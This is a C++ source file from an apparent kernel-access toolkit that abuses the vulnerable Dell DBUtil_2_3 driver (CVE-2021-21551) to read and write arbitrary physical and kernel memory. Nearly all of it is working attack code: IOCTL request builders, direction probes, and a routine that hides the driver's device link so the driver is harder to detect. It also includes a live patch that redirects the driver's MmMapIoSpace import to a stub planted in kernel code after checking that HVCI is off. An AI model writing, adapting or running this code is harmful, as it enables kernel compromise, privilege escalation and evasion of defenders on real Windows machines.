#include "r0.hpp"
#include <windows.h>
#include <winternl.h>
#include "vmm.hpp"          // phys_is_ram guard for the MmMapIoSpace path
#include "cloak.hpp"        // loader-list locator, primary driver-base source
#include <cstring>
#include <cstdio>
#include <vector>

namespace r0 {

// DBUtil_2_3 (Dell BIOS flash utility driver, CVE-2021-21551).
//
// The IOCTL codes and request layouts below were read out of the shipped
// driver image by disassembling its IRP dispatch, not guessed.
//
//   0x9B0C1F40  physical read    { u64 hdr; u64 pa; u8 payload[]; }  0x10 + n
//   0x9B0C1F44  physical write   { u64 hdr; u64 pa; u8 payload[]; }  0x10 + n
//   0x9B0C1EC4  kernel-VA read   { u64 hdr; u64 va; u64 off; u8 p[]; } 0x18 + n
//   0x9B0C1EC8  kernel-VA write  { u64 hdr; u64 va; u64 off; u8 p[]; } 0x18 + n
//
// The physical pair maps with MmMapIoSpace; the kernel-VA pair memmoves in the
// caller's thread context.
namespace {

constexpr DWORD kPhysRead  = 0x9B0C1F40;
constexpr DWORD kPhysWrite = 0x9B0C1F44;
constexpr DWORD kKernWrite = 0x9B0C1EC8;
constexpr DWORD kKernRead  = 0x9B0C1EC4;

constexpr size_t kPhysHdr = 0x10;          // { u64 hdr; u64 pa }
constexpr size_t kKernHdr = 0x18;          // { u64 hdr; u64 va; u64 off }

HANDLE g_dev = INVALID_HANDLE_VALUE;
bool   g_vread_ok = false;

int try_vread(uint64_t va, size_t len, bool payload, bool& zero_back) {
    zero_back = false;
    std::vector<uint8_t> in(kKernHdr + (payload ? len : 0), 0);
    memcpy(in.data() + 0x08, &va, 8);

    std::vector<uint8_t> out(kKernHdr + len, 0xCC);
    DWORD got = 0;
    if (!DeviceIoControl(g_dev, kKernRead, in.data(), (DWORD)in.size(),
                         out.data(), (DWORD)out.size(), &got, nullptr))
        return -1;

    static const uint8_t mz[2] = { 'M', 'Z' };
    if (len >= 2) {
        if (memcmp(out.data() + kKernHdr, mz, 2) == 0) return 1;
        if (memcmp(out.data(), mz, 2) == 0) return 1;
    }

    if (payload) {
        bool z = true;
        for (size_t i = 0; i < len; ++i) if (out[kKernHdr + i]) { z = false; break; }
        zero_back = z;
    }
    return 0;
}

bool open_dev() {
    g_dev = CreateFileW(L"\\\\.\\DBUtil_2_3", GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                        OPEN_EXISTING, 0, nullptr);
    if (g_dev != INVALID_HANDLE_VALUE) return true;

    // With the symlink hidden \\.\DBUtil_2_3 no longer resolves. Open the
    // device object directly in the NT namespace instead.
    const wchar_t* p = L"\\Device\\DBUtil_2_3";
    UNICODE_STRING un{};
    un.Buffer = const_cast<PWSTR>(p);
    un.Length = un.MaximumLength = (USHORT)(wcslen(p) * sizeof(wchar_t));
    OBJECT_ATTRIBUTES oa{};
    InitializeObjectAttributes(&oa, &un, OBJ_CASE_INSENSITIVE, nullptr, nullptr);
    IO_STATUS_BLOCK iosb{};
    using Fn = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK,
                                PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
    const auto nt = reinterpret_cast<Fn>(
        reinterpret_cast<void*>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateFile")));
    if (!nt) return false;
    HANDLE h = nullptr;
    if (nt(&h, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, &oa, &iosb, nullptr, 0,
           FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, 0, nullptr, 0) < 0) return false;
    g_dev = h;
    return true;
}

void close_dev() {
    if (g_dev != INVALID_HANDLE_VALUE) { CloseHandle(g_dev); g_dev = INVALID_HANDLE_VALUE; }
}

bool do_read(uint64_t pa, void* out, size_t len) {
    if (g_dev == INVALID_HANDLE_VALUE || !len) return false;
    std::vector<uint8_t> buf(kPhysHdr + len, 0);
    memcpy(buf.data() + 0x08, &pa, 8);
    DWORD got = 0;
    if (!DeviceIoControl(g_dev, kPhysRead, buf.data(), (DWORD)buf.size(),
                         buf.data(), (DWORD)buf.size(), &got, nullptr))
        return false;
    memcpy(out, buf.data() + kPhysHdr, len);
    return true;
}

bool do_write(uint64_t pa, const void* in, size_t len) {
    if (g_dev == INVALID_HANDLE_VALUE || !len) return false;
    std::vector<uint8_t> buf(kPhysHdr + len, 0);
    memcpy(buf.data() + 0x08, &pa, 8);
    memcpy(buf.data() + kPhysHdr, in, len);
    DWORD got = 0;
    return DeviceIoControl(g_dev, kPhysWrite, buf.data(), (DWORD)buf.size(),
                           buf.data(), (DWORD)buf.size(), &got, nullptr) != 0;
}

bool do_vread(uint64_t va, void* out, size_t len) {
    if (g_dev == INVALID_HANDLE_VALUE || !len) return false;
    if (va < 0xFFFF800000000000ull) return false;
    std::vector<uint8_t> buf(kKernHdr + len, 0);
    memcpy(buf.data() + 0x08, &va, 8);
    const uint64_t off = 0;
    memcpy(buf.data() + 0x10, &off, 8);
    DWORD got = 0;
    if (!DeviceIoControl(g_dev, kKernRead, buf.data(), (DWORD)buf.size(),
                         buf.data(), (DWORD)buf.size(), &got, nullptr))
        return false;
    memcpy(out, buf.data() + kKernHdr, len);
    return true;
}

bool do_vwrite(uint64_t va, const void* in, size_t len) {
    if (g_dev == INVALID_HANDLE_VALUE || !len) return false;
    if (va < 0xFFFF800000000000ull) return false;
    std::vector<uint8_t> buf(kKernHdr + len, 0);
    memcpy(buf.data() + 0x08, &va, 8);
    const uint64_t off = 0;
    memcpy(buf.data() + 0x10, &off, 8);
    memcpy(buf.data() + kKernHdr, in, len);
    DWORD got = 0;
    return DeviceIoControl(g_dev, kKernWrite, buf.data(), (DWORD)buf.size(),
                           buf.data(), (DWORD)buf.size(), &got, nullptr) != 0;
}

Backend g_be_local{L"\\\\.\\DBUtil_2_3", open_dev, close_dev,
                   do_read, do_write, do_vwrite, do_vread};
const Backend* g_be = nullptr;

} // anonymous namespace

bool g_write_ok = false;

// ---------------------------------------------------------------------------
// Direction probe for the kernel-VA pair. A transposed pair would memmove
// zeroes over ntoskrnl's header, so the direction is proven before use.
// Stage A carries the header only (harmless under either reading).
// ---------------------------------------------------------------------------
bool vread_probe(uint64_t va, size_t len) {
    if (g_vread_ok) return true;
    if (g_dev == INVALID_HANDLE_VALUE || !len || len > 64) return false;
    if (va < 0xFFFF800000000000ull) return false;

    bool zb = false;
    if (try_vread(va, len, false, zb) == 1) { g_vread_ok = true; return true; }
    if (try_vread(va, len, true, zb) == 1) { g_vread_ok = true; return true; }

    if (zb) {
        vmm::g_ntos_mz_broken = true;
        printf("[!] kernel-VA pair is TRANSPOSED: 0x%08X behaves as a write. "
               "ntoskrnl+0 now holds 00 00; header paths are degraded for this "
               "boot.\n", (unsigned)kKernRead);
    }
    return false;
}

bool vread_ready() { return g_vread_ok; }

static bool fail(const char* why) {
    printf("[r0] init FAIL: %s\n", why);
    return false;
}

bool phys_read_raw(uint64_t pa, void* buf, size_t len);

bool init() {
    if (g_be) return true;
    if (!open_dev()) return fail("no device handle");

    // 1. IOCTL ciftinin yonu. Basligi degil, davranisi kanitla.
    uint8_t a[16] = {}, b[16] = {};
    if (!phys_read_raw(0x0, a, sizeof a))
        return fail("phys read at 0x0 failed - write path is being used?");
    bool nz = false;
    for (size_t i = 0; i < sizeof a; ++i) nz |= (a[i] != 0);
    if (!nz)
        return fail("read of 0x0 returned zeros - 0x9B0C1F40/44 transposed");
    if (!phys_read_raw(0x0, b, sizeof b))
        return fail("second read at 0x0 failed");
    if (memcmp(a, b, sizeof a) != 0)
        return fail("read path unstable - two reads of 0x0 differ");
    printf("[r0] direction proven: 0x9B0C1F40=read 0x9B0C1F44=write\n");

    // 2. Yazma yolu, okuma yolu kanitlanana kadar kapali.
    g_write_ok = false;
    g_be = &g_be_local;
    return true;
}

// kwtest: yazma yonunu kanitlayan tek sey. Ayni 8 byte'i geri yazar.
bool kwtest(uint64_t sys_eproc) {
    if (!sys_eproc) return false;
    uint64_t v = 0;
    if (!vmm::kread_trusted(sys_eproc, &v, sizeof v)) return false;
    if (!vmm::kwrite_trusted(sys_eproc, &v, sizeof v)) return false;
    uint64_t back = 0;
    if (!vmm::kread_trusted(sys_eproc, &back, sizeof back)) return false;
    if (back != v) return false;
    g_write_ok = true;
    printf("[r0] write path proven\n");
    return true;
}

void shutdown() {
    if (g_be) { g_be->close(); g_be = nullptr; }
}

bool alive() { return g_be != nullptr; }
void set_backend(const Backend* be) { g_be = be; }

// Physical reads go ONLY through the driver's MmMapIoSpace IOCTL: it refuses
// unmappable ranges with a NULL mapping instead of faulting, so a wrong
// address costs a failed read, never a bugcheck. The RAM guard keeps the walk
// out of MMIO holes.
bool pread(uint64_t pa, void* buf, size_t len) {
    if (!g_be) return false;
    if (!len) return true;
    if (!vmm::phys_is_ram(pa, len)) return false;
    return g_be->read(pa, buf, len);
}

bool pwrite(uint64_t pa, const void* buf, size_t len) {
    if (!g_be) return false;
    return g_be->write(pa, buf, len);
}

// phys_read_raw: physical read that bypasses the phys_is_ram guard, so a
// hole address can still be observed. Used only for the P1 direction oracle
// at physical 0x0 (IVT, unused after boot - safe to read).
bool phys_read_raw(uint64_t pa, void* buf, size_t len) {
    if (!len) return true;
    return do_read(pa, buf, len);
}

bool vwrite(uint64_t va, const void* buf, size_t len) {
    if (!g_be) return false;
    return g_be->vwrite(va, buf, len);
}

bool vread(uint64_t va, void* buf, size_t len) {
    if (!g_be) return false;
    return g_be->vread(va, buf, len);
}

// ---------------------------------------------------------------------------
// \??\DBUtil_2_3 removal.
//
// IoCreateSymbolicLink creates the link as a permanent object, so the way to
// remove the name is: open the link with DELETE, NtMakeTemporaryObject clears
// OBJ_PERMANENT, close - the directory entry goes away. The device object is
// not touched, so our open handle keeps working and only new opens by path
// fail. Permanent for the boot.
// ---------------------------------------------------------------------------
using NtOpenSymbolicLinkObjectFn = NTSTATUS (NTAPI*)(HANDLE*, ACCESS_MASK, PUNICODE_STRING);
using NtMakeTemporaryObjectFn    = NTSTATUS (NTAPI*)(HANDLE);

bool hide_symlink(const wchar_t* link) {
    if (!link || !*link) return false;

    HMODULE nt = GetModuleHandleW(L"ntdll.dll");
    if (!nt) return false;
    const auto nt_open = reinterpret_cast<NtOpenSymbolicLinkObjectFn>(
        reinterpret_cast<void*>(GetProcAddress(nt, "NtOpenSymbolicLinkObject")));
    const auto nt_temp = reinterpret_cast<NtMakeTemporaryObjectFn>(
        reinterpret_cast<void*>(GetProcAddress(nt, "NtMakeTemporaryObject")));
    if (!nt_open || !nt_temp) {
        printf("[!] ntdll is missing NtOpenSymbolicLinkObject / NtMakeTemporaryObject\n");
        return false;
    }

    UNICODE_STRING name{};
    name.Buffer = const_cast<PWSTR>(link);
    name.Length = static_cast<USHORT>(wcslen(link) * sizeof(wchar_t));
    name.MaximumLength = name.Length;

    HANDLE h = nullptr;
    NTSTATUS st = nt_open(&h, DELETE, &name);
    if (st < 0) {
        printf("[!] open %ls failed: 0x%08lX - DELETE access refused?\n",
               link, static_cast<unsigned long>(st));
        return false;
    }

    st = nt_temp(h);
    CloseHandle(h);
    if (st < 0) {
        printf("[!] NtMakeTemporaryObject failed: 0x%08lX\n", static_cast<unsigned long>(st));
        return false;
    }

    // Prove the name is gone: only not-found counts as success.
    HANDLE probe = CreateFileW(L"\\\\.\\DBUtil_2_3", GENERIC_READ,
                               FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                               OPEN_EXISTING, 0, nullptr);
    if (probe != INVALID_HANDLE_VALUE) {
        CloseHandle(probe);
        printf("[!] \\\\.\\DBUtil_2_3 still opens - the link was not removed\n");
        return false;
    }
    const DWORD err = GetLastError();
    if (err != ERROR_FILE_NOT_FOUND && err != ERROR_PATH_NOT_FOUND) {
        printf("[!] \\\\.\\DBUtil_2_3 still resolves (error %lu) - link not removed\n", err);
        return false;
    }
    return true;
}

// ---------------------------------------------------------------------------
// Cached physical mapping patch (--dpatch).
//
// The shipped driver calls MmMapIoSpace(pa, len, MmNonCached). On build 26200
// MiFillSystemPtes refuses MmNonCached mappings of any page whose PFN is owned
// as a page table and returns STATUS_CONFLICTING_ADDRESSES, so every PML4 /
// PDPTE / PDE / PTE read dies while ordinary data RAM reads fine.
//
// The fix is applied live through the proven kernel-VA write: the driver's
// import slot for MmMapIoSpace (RVA 0x12048) is redirected to an 18-byte stub
// planted in the driver's own int3 padding (RVA 0x1161e, .text, MEM_NOT_PAGED):
//
//   41 b8 01 00 00 00   mov  $1,%r8d        ; CacheType = MmCached
//   48 b8 <real>        movabs $real,%rax   ; real = ntos!MmMapIoSpace
//   ff e0               jmp  %rax
//
// Every byte is verified before writing. If HVCI is running, kernel code pages
// are read-only and a write there bugchecks - so the patch refuses outright
// instead. Memory-only: re-run --dpatch after every boot, BEFORE --cloak.
// ---------------------------------------------------------------------------
namespace {

using NtQuerySystemInformationFn = NTSTATUS (NTAPI*)(ULONG, PVOID, ULONG, PULONG);

NtQuerySystemInformationFn get_qsi() {
    HMODULE nt = GetModuleHandleW(L"ntdll.dll");
    if (!nt) return nullptr;
    return reinterpret_cast<NtQuerySystemInformationFn>(
        reinterpret_cast<void*>(GetProcAddress(nt, "NtQuerySystemInformation")));
}

bool hvci_running() {
    const auto qs = get_qsi();
    if (!qs) return true;
    struct { ULONG length; ULONG options; } ci{ 8, 0 };
    ULONG ret = 0;
    // SystemCodeIntegrityInformation = 103; option bit 0x2 = HVCI enabled.
    if (qs(103, &ci, sizeof(ci), &ret) < 0) return true;
    return (ci.options & 0x2) != 0;
}

// Fallback locator: SystemModuleInformation. Byte-stride walk (SYSTEM_MODULE
// is 296 bytes with ModuleName at +0x28, and ImageSize is 32-bit at +0x18).
bool find_driver_base(uint64_t& base, uint32_t& size) {
    const auto qs = get_qsi();
    if (!qs) return false;

    std::vector<uint8_t> buf;
    ULONG got = 0;
    bool have = false;
    for (int attempt = 0; attempt < 4; ++attempt) {
        ULONG need = 0;
        qs(11, nullptr, 0, &need);
        if (!need || need > (1u << 24)) return false;
        need += 0x1000 * static_cast<ULONG>(attempt + 1);
        buf.assign(need, 0);
        got = need;
        const LONG st = qs(11, buf.data(), need, &got);
        if (st == 0) { have = true; break; }
        if (static_cast<ULONG>(st) != 0xC0000004ul) return false;
    }
    if (!have || buf.size() < 8) return false;

    const uint32_t count = *reinterpret_cast<uint32_t*>(buf.data());
    if (!count || count > 4096) return false;
    size_t stride = (got - 8) / count;
    if (stride < 0x128) stride = 0x128;

    for (uint32_t i = 0; i < count; ++i) {
        const size_t off = 8 + static_cast<size_t>(i) * stride;
        if (off + 0x128 > buf.size()) break;
        const char* nm = reinterpret_cast<const char*>(&buf[off + 0x28]);
        char lower[256]{};
        const size_t n = strnlen(nm, 256);
        for (size_t k = 0; k < n; ++k)
            lower[k] = (nm[k] >= 'A' && nm[k] <= 'Z') ? static_cast<char>(nm[k] + 32) : nm[k];
        if (!strstr(lower, "dbutil_2_3")) continue;
        uint64_t ib{}; uint32_t isz{};
        memcpy(&ib, &buf[off + 0x10], 8);
        memcpy(&isz, &buf[off + 0x18], 4);
        if (ib < 0xFFFF000000000000ull || !isz) continue;
        base = ib; size = isz;
        return true;
    }
    return false;
}

} // anonymous namespace

bool patch_cached_map() {
    if (hvci_running()) {
        printf("[!] HVCI is running - kernel code pages are read-only and the\n"
               "    cached-map patch would bugcheck. The patch is refused.\n");
        return false;
    }
    if (!vmm::g_ntos) {
        printf("[!] ntoskrnl base unknown\n");
        return false;
    }

    // ntos!MmMapIoSpace RVA for this build; the prologue check below proves
    // the RVA before anything is written.
    const uint64_t real_map = vmm::g_ntos + 0x487ab0ull;
    static const uint8_t kHead[16] = {
        0x48, 0x83, 0xEC, 0x28, 0x41, 0x0F, 0xB6, 0xC0,
        0x83, 0xF8, 0x06, 0x73, 0x2B, 0x41, 0xB8, 0x40 };
    uint8_t head[16]{};
    if (!vread(real_map, head, sizeof(head))) {
        printf("[!] cannot read ntos!MmMapIoSpace at 0x%llx\n", (unsigned long long)real_map);
        return false;
    }
    if (memcmp(head, kHead, sizeof(head)) != 0) {
        printf("[!] bytes at ntos+0x487ab0 are not MmMapIoSpace - not patching\n"
               "    prologue seen:");
        for (uint8_t b : head) printf(" %02x", b);
        printf("\n");
        return false;
    }

    uint64_t drv{};
    uint32_t drv_size{};
    bool have = cloak::module_base(drv, drv_size);
    if (!have) {
        printf("[*] loader-list locator failed - trying the module query\n");
        have = find_driver_base(drv, drv_size);
    }
    if (!have) {
        printf("[!] DBUtil_2_3 module not located\n"
               "    either the driver is not loaded (sc start DBUtil_2_3) or it is\n"
               "    already cloaked this boot: reboot, load the driver, then run\n"
               "    --dpatch BEFORE --cloak\n");
        return false;
    }
    printf("[+] driver module base 0x%llx size 0x%x\n",
           (unsigned long long)drv, drv_size);

    // Layout facts from disassembling the shipped image:
    //   0x12048  import slot for MmMapIoSpace (shared by read and write)
    //   0x15165  xor %r8d,%r8d  -> CacheType = MmNonCached before the call
    //   0x1161e  18 bytes of int3 padding in .text - room for the stub
    const uint64_t kImport = drv + 0x12048ull;
    const uint64_t kPad    = drv + 0x1161eull;
    const uint64_t stub    = kPad;

    uint64_t imp{};
    if (!vread(kImport, &imp, 8)) {
        printf("[!] cannot read the import slot\n");
        return false;
    }

    uint8_t kStub[18] = {
        0x41, 0xB8, 0x01, 0x00, 0x00, 0x00,          // mov $1,%r8d (MmCached)
        0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,          // movabs $real,%rax
        0xFF, 0xE0 };                                // jmp %rax
    memcpy(kStub + 8, &real_map, 8);

    if (imp == stub) {
        printf("[*] import already points at the cached-map stub\n");
    } else {
        if (imp != real_map) {
            printf("[!] import slot holds 0x%llx, expected ntos!MmMapIoSpace 0x%llx"
                   " - not patching\n",
                   (unsigned long long)imp, (unsigned long long)real_map);
            return false;
        }

        uint8_t pad[18]{};
        if (!vread(kPad, pad, sizeof(pad))) {
            printf("[!] cannot read the stub slot\n");
            return false;
        }
        if (memcmp(pad, kStub, sizeof(pad)) != 0) {
            // Pure int3 padding only. Anything else is a different build.
            for (size_t i = 0; i < sizeof(pad); ++i) {
                if (pad[i] != 0xCC) {
                    printf("[!] stub slot 0x%llx byte %zu is 0x%02x, not int3"
                           " - not patching\n",
                           (unsigned long long)kPad, i, pad[i]);
                    return false;
                }
            }
            if (!vwrite(kPad, kStub, sizeof(kStub))) {
                printf("[!] stub write failed\n");
                return false;
            }
            uint8_t chk[18]{};
            if (!vread(kPad, chk, sizeof(chk)) || memcmp(chk, kStub, sizeof(chk)) != 0) {
                printf("[!] stub read-back mismatch\n");
                return false;
            }
            printf("[+] cached-map stub planted at 0x%llx\n", (unsigned long long)kPad);
        }

        if (!vwrite(kImport, &stub, 8)) {
            printf("[!] import pointer write failed\n");
            return false;
        }
        uint64_t chk2{};
        if (!vread(kImport, &chk2, 8) || chk2 != stub) {
            printf("[!] import read-back mismatch\n");
            return false;
        }
        printf("[+] MmMapIoSpace import redirected to the stub (MmCached)\n");
    }

    // Prove it: the addresses that refused before, plus a known-good one.
    struct T { uint64_t pa; const char* tag; bool must; };
    const T tests[] = {
        { 0x1ae000, "System PML4",         true  },
        { 0x200000, "RAM",                 true  },
        { 0x400,    "firmware BDA",        false },
    };
    bool all = true;
    for (const T& tc : tests) {
        uint8_t b[16]{};
        const bool ok = pread(tc.pa, b, sizeof(b));
        printf("[*] phys read 0x%llx (%-14s): %s  %02x %02x %02x %02x %02x %02x %02x %02x\n",
               (unsigned long long)tc.pa, tc.tag, ok ? "OK" : "FAIL",
               b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]);
        if (tc.must && !ok) all = false;
    }
    if (!all) {
        printf("[!] page-table physical reads still fail after the patch\n");
        return false;
    }
    printf("[*] patch is memory-only: re-run --dpatch on every boot, before --cloak\n");
    return true;
}

} // namespace r0
